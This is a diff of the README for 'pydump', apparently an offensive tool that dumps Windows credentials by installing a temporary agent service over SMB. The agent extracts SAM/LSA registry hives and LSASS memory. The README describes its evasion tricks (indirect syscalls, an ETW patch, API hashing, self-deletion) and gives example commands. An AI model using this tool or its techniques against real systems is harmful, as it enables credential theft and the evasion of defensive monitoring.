@@ -14,17 +14,21 @@ Zero external tool dependencies. No impacket, no nxc, no lsassy.
 
 ## How it works
 
-pydump combines two extraction methods, both over a single SMB connection:
+pydump deploys a lightweight native agent (24KB, x64) on the target as a
+temporary Windows service. The agent performs **all privileged operations**
+locally:
 
-**Registry secrets** (SAM/LSA) are extracted via Windows RPC: the tool calls
-`RegSaveKey` to save hive snapshots, reads them over SMB, then parses and decrypts
-offline. This uses standard Windows administration APIs and requires no executable
-on the target.
+1. **Registry hives**: enables `SeBackupPrivilege`, calls `RegSaveKeyW` to
+   snapshot SAM/SYSTEM/SECURITY, reads them into memory, deletes temp files
+2. **LSASS memory**: reads process memory using indirect syscalls, builds a
+   MiniDump in-memory
+3. **Exfiltration**: streams everything back through a named pipe using a
+   binary protocol (`PYD\x01` header + hive data + MDMP)
+4. **Cleanup**: self-deletes from disk via ADS rename before exiting
 
-**LSASS memory** requires a native agent (19KB, x64) deployed as a temporary
-service. The agent reads LSASS process memory using indirect syscalls, builds a
-MiniDump in-memory, streams it back through a named pipe, then self-deletes.
-No dump file is written to disk.
+The Python orchestrator handles deployment (SMB upload + service creation),
+receives the pipe data, then parses and decrypts offline — no direct
+registry or process access from the network.
 
 ## Architecture
 
@@ -33,15 +37,11 @@ ORCHESTRATOR (Linux/Python)                   TARGET (Windows)
 ┌──────────────────────┐         SMB 445      ┌──────────────────────┐
 │  pydump CLI          │◄───────────────────►│                      │
 │                      │                      │  SVCCTL → Service    │
-│  ┌─ registry ──────┐ │   WinReg RPC        │  ┌─────────────────┐ │
-│  │ SAM + LSA       │ │◄────────────────────►│  │ RegSaveKey      │ │
-│  │ offline decrypt │ │   hive snapshots     │  │ SAM/SYSTEM/SEC  │ │
-│  └─────────────────┘ │                      │  └─────────────────┘ │
-│                      │                      │                      │
-│  ┌─ agent ─────────┐ │   upload + execute   │  ┌─────────────────┐ │
-│  │ LSASS → parse   │ │─────────────────────►│  │ agent.exe       │ │
-│  │ NTLM + WDigest  │ │◄─────────────────────│  │ indirect syscall│ │
-│  └─────────────────┘ │   named pipe stream  │  │ ETW patch       │ │
+│  ┌─ agent output ──┐ │   upload + execute   │  ┌─────────────────┐ │
+│  │ hives → decrypt  │ │─────────────────────►│  │ agent.exe       │ │
+│  │ LSASS → parse    │ │◄─────────────────────│  │ RegSaveKey      │ │
+│  └─────────────────┘ │   named pipe stream  │  │ LSASS dump      │ │
+│                      │   (hives + MDMP)     │  │ ETW patch       │ │
 │                      │                      │  │ self-delete     │ │
 └──────────────────────┘                      │  └─────────────────┘ │
                                               └──────────────────────┘
@@ -57,7 +57,7 @@ pydump/                 Python orchestrator
 │   ├── core.py         DCE/RPC bind/request
 │   ├── ndr.py          NDR encoding
 │   ├── svcctl.py       Service Control Manager
-│   └── winreg.py       Remote Registry (RegSaveKey)
+│   └── winreg.py       Remote Registry (legacy RPC path)
 ├── secrets/
 │   ├── hivereader.py   Custom REGF hive parser
 │   ├── crypto.py       Boot key, SAM/LSA AES/DES/RC4 decrypt
@@ -68,10 +68,11 @@ pydump/                 Python orchestrator
     ├── minidump.py     MDMP format parser
     └── extract.py      Credential extraction (MSV1.0, WDigest)
 
-agent/                  Native x64 agent (19KB, no CRT)
+agent/                  24KB x64 PE, MinGW cross-compiled
 ├── src/
-│   ├── main.c          Entry, self-delete (ADS rename)
+│   ├── main.c          Entry, protocol, self-delete
 │   ├── syscalls.c      Hell's Gate SSN resolution, ETW patch
+│   ├── registry.c      RegSaveKey hive extraction
 │   ├── dump.c          LSASS memory read → MDMP stream
 │   └── pipe.c          Named pipe server
 └── include/
@@ -98,7 +99,7 @@ Dependencies: `smbprotocol` + `pycryptodome` only.
 # Full extraction (registry + LSASS)
 python -m pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd'
 
-# Registry only (SAM + LSA, no agent needed)
+# Registry only (no LSASS, no PID lookup)
 python -m pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -m registry
 
 # LSASS only
@@ -122,7 +123,7 @@ python -m pydump parse -f lsass.dmp
 | API hashing | All Nt* exports resolved by DJB2 hash — zero plaintext function names |
 | ETW patch | `EtwEventWrite` overwritten with `xor eax,eax; ret` via `NtProtectVirtualMemory` |
 | Self-delete | ADS rename + `FileDispositionInfo` — binary removed before `ExitProcess` |
-| No CRT | `-nostdlib -nostartfiles`, 19KB PE |
+| No CRT | `-nostdlib -nostartfiles`, 24KB binary |
 
 ## Requirements
 
